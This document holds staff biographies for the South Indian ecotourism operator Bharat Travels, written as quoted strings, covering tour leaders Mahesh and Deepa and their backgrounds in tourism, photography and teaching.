            "A Commerce Graduate from a premier institute in Madras, Maheshs  inherent interests is on  the natural history and cultural traditions of South India. His 6 years tenure as a travelling photographer in Nilgiris and Thanjavur Delta has ingrained in him exhaustive knowledge of its topography, natural history and culture. Mahesh believes that conservation of South Indian natural history and culture is possible  if responsible tourism adds value to the self esteem of local people.  Mahesh has combined his passion for ecology  and his family back ground in tourism to become the first Eco tourism operator and tour leader in South India. Seeing without spoiling and participating without polluting are the key slogan for Bharat Travels Eco tourism efforts. Every year from September through February he is busy travelling all over south India building relationship between himself, local inhabitants, visitors and natural habitat. ",
            "As the secretary of PATA South India Chapter he has put together workshops on sustainable tourism development for guides, outfitters, operators and government officials. His background and experience prompted the Director General of Tourism to present an action paper for a National Policy on Ecotourism",
            "Mahesh and his wife Nimu  - an amateur mountaineer   live in Chennai. Until their 2 year old son was born they lead many trips as a husband and wife team. His hobbies are south Indian cooking, photography and folk arts.  ",
            "Deepa",
            "Born and raised in Pondicherry, a Masters in Tourism Administration and extensive reading of cultural traditions of South India has given her a sharper perspective of South Indian.  During her one year tenure as a faculty of tourism at Avinashi Lingam University Deepa advocated the need for student to touch and feel tourism in the field instead of listening to lectures and meddling with slide projectors in a class room. She has organized several study trips on cross cultural tourism all over India before she quit teaching. ",
            "Deepa joined ecotourism operations in Bharat Travels during a depressed phase when drop in visitor arrivals were daunting  the belief of the company and  native artists and local people who were dependent on its tourism initiative.  Her enthusiasm, humane approach and dedication towards responsible tourism motivated the company and its stake holders in ecotourism to tide over hard times. ",
            "As an experienced  tour leader Deepa has lead trips for a cross section of interest groups. Her list includes unaccompanied children seeking  wilderness experience, cross cultural students exchange programs, serious meditation groups, families and elders in pursuit of  south Indian native experience. Her biggest asset is her  passion to share the cultural and natural beauty of India as a tour leader.",
